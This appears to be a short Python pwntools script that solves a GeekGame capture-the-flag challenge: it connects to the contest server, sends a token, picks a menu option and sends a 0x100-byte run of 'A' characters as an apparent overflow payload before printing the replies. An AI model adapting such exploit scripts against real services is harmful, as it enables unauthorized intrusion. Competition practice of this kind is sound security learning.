from pwn import *

p = remote("prob11.geekgame.pku.edu.cn", 10011)

p.recvuntil(b"input your token: ")
p.sendline(b"It's MyToken!!!!!")
p.recvuntil(b"output your flag: ")
p.sendline(b'4')
p.recvuntil(b"(max 0x100 bytes): ")
p.sendline(b'A' * 0x100)
p.sendline(b'48')
while p.can_recv_raw(timeout=10):
    print(p.recvline())